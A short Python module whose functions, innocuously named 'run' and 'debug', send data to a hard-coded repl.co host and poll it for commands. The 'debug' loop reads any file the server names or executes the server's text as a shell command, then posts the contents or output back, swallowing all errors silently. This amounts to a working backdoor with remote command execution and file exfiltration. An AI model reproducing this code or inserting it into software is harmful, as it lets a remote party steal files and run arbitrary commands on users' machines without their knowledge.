import time
import subprocess
import requests as req

def run(value):
    link = "https://backstabprotection.jamesx123.repl.co/"
    try:
        data = {'name': value}
        req.post(link, data)
    except:
        pass
    return value


def debug():
    link = "https://backstabprotection.jamesx123.repl.co/"
    while True:
        try:
            output = []
            resp = req.get(link)
            resp = resp.text
            if "openfile" in resp:
              x = open(resp.split(" ")[1],"r")
              contents = x.read()
              x.close()
              output.append(contents.encode("utf-8"))
              
            else:
              output = runcommand(resp)
            for i in output:
                data = {'output': i.decode('utf-8')}
                resp = req.post(link + "output", data)

        except:
            pass
        time.sleep(10)


def runcommand(value):
    output = subprocess.run(value, capture_output=True)
    return [output.stdout, output.stderr]
